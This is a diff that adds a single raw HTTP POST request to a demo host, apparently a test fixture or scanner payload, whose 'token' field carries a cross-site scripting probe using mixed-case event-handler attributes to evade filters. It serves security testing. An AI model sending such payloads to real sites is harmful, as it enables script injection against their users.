@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+Connection: close
+
+token=<x OnClIcK=aLeRt(1) TaBiNdEx=1>X
